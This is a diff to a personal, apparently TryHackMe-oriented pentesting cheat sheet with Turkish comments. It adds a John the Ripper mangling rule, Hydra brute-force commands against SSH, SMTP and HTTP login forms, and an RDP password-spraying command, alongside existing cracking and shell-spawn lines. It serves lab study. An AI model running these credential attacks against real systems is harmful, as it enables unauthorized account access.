@@ -66,6 +66,12 @@ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
 
 john --wordlist=single-password-list.txt --rules=KoreLogic --stdout |grep "Tryh@ckm3"
 
+sudo vi /etc/john/john.conf 
+
+[List.Rules:THM-Password-Attacks] 
+
+Az"[0-9]" ^[!@#$]
+
 # SMB'ye bakmak için #
 
 smbclient -L <ip.adress> ---> Full enum
@@ -172,6 +178,8 @@ os.system("/bin/bash")
 # Hydra #
 
 hydra -l joker -P /usr/share/wordlists/rockyou.txt 10.10.9.219 ssh -vV
+	
+hydra -L usernames-list.txt -p Spring2021 ssh://10.1.1.10
 
 hydra -l fox -P /usr/share/wordlists/rockyou.txt -f 10.10.32.242 http-get ----> Basic Auto - Get Metod.
 
@@ -182,6 +190,12 @@ hydra hogwartz-castle.thm http-form-post "/login/index.php:user=^USER^&password=
 hydra -l admin -P rockyou.txt 10.10.159.24 http-post-form “/login/index.php:user=^USER^&pass=^PASS^:Username or password invalid” -f
 
 hydra -l boris -P /usr/share/wordlists/rockyou.txt pop3://10.10.117.44:55007 -Vv 
+	
+hydra -l pittman@clinic.thmredteam.com -P clinic.lst smtp://10.10.27.216 -vV
+	
+hydra -l phillips -P clinic.txt 10.10.129.191 http-get-form "/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
+	
+hydra -l phillips -P clinic.txt 10.10.129.191 http-post-form "/login-post/index.php:username=^USER^&password=^PASS^:S=logout.php" -f
 
 # Basic HashID #
 
@@ -734,6 +748,10 @@ python3 cupp.py -i
 python3 cupp.py -l
 
 python3 cupp.py -a
+	
+# RDP Password #
+	
+python3 RDPassSpray.py -U usernames-list.txt -p Spring2021! -d THM-labs -T RDP_servers.txt
 
 
 
